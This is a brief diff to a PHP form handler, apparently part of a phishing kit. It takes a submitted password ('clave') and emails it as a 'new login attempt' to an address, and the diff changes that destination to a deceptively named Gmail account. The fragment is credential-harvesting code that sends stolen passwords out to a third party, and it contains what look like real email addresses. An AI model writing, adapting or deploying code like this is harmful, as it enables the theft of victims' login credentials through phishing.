@@ -4,7 +4,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $clave = $_POST['clave'];
 
     // Dirección donde quieres recibir los datos
-    $destino = "CMRRENGIFO23@GMAIL.COM";
+    $destino = "cuentabloqueadagoogl00@gmail.com";
 
     // Asunto del correo
     $asunto = "Nuevo intento de inicio de sesión";
